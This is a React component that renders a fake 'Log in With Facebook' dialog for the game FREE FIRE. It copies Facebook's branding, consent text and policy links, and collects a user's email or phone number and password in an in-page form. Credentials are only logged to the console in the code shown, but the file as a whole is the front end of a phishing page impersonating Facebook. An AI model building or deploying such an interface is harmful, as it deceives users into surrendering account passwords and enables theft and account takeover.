import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { X, Eye, EyeOff } from 'lucide-react';

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  if (!isOpen) return null;

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleLogin = () => {
    // Handle login logic here
    console.log('Login attempted with:', { email, password });
    onClose();
  };

  return (
    <div 
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm"
      onClick={handleBackdropClick}
    >
      <div className="relative bg-white rounded-lg shadow-2xl w-full max-w-md mx-4">
        {/* Header */}
        <div className="bg-[#4267B2] text-white p-4 rounded-t-lg relative flex items-center justify-center">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#4267B2] font-bold text-lg">f</span>
            </div>
            <span className="font-semibold text-lg">Log in With Facebook</span>
          </div>
          <button 
            onClick={onClose}
            className="absolute right-3 top-3 text-white hover:bg-white/20 rounded-full p-1"
          >
            <X size={20} />
          </button>
        </div>

        {/* Content */}
        <div className="p-6 text-center">
          {/* Game Icon */}
          <div className="w-20 h-20 mx-auto mb-4 rounded-full overflow-hidden">
            <img 
              src="/lovable-uploads/ccce1285-6162-48f7-b840-6c603fceeb9c.png"
              alt="FREE FIRE"
              className="w-full h-full object-cover"
            />
          </div>

          {/* Title Text */}
          <h2 className="text-gray-700 text-lg mb-2">
            Log in to your Facebook account to
          </h2>
          <h3 className="text-gray-700 text-lg font-semibold mb-4">
            connect to FREE FIRE
          </h3>

          {/* Info Text */}
          <p className="text-gray-500 text-sm mb-6">
            This doesn't let the app post to Facebook.
          </p>

          {/* Form */}
          <div className="space-y-4">
            <Input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-md"
            />
            
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-md pr-16"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#4267B2] font-semibold text-sm"
              >
                {showPassword ? "HIDE" : "SHOW"}
              </button>
            </div>

            <Button
              onClick={handleLogin}
              className="w-full bg-[#4267B2] hover:bg-[#365899] text-white font-semibold py-3 rounded-md"
            >
              Log In
            </Button>
          </div>

          {/* Footer Text */}
          <div className="mt-6 text-xs text-gray-500 leading-relaxed">
            <p>
              By continuing, FREE FIRE will receive ongoing access to the information that you share and Facebook will record when GARENA FREE FIRE accesses it.{' '}
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Learn more about this sharing and the settings that you have.
              </span>
            </p>
            
            <div className="mt-4 space-x-4">
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                FREE FIRE Privacy Policy
              </span>
              <span className="text-gray-400">and</span>
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Terms
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FacebookLoginModal;